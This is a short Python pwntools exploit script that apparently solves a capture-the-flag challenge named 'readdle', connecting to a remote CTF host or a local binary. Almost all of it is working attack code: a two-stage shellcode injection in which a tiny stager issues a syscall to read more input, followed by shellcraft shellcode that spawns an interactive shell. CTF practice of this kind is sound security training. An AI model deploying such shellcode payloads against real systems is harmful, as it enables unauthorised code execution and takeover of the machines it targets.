from pwn import *
elf = ELF('./readdle')
context.binary = elf
context.terminal = ()
if args.REMOTE:
    p = remote('readdle.challs.olicyber.it', 10018)
elif args.GDB:
    p = gdb.debug([elf.path],'''
                  b main
                  c
                  '''
                  )
else:
    p = process([elf.path])

shellcode = asm('''
                mov dh, 100
                syscall
                ''')
shellcode_shell = asm(shellcraft.amd64.linux.sh())
p.recvline()
print(shellcode)
p.send(shellcode)
p.send(b'a'*4 + shellcode_shell)
p.interactive()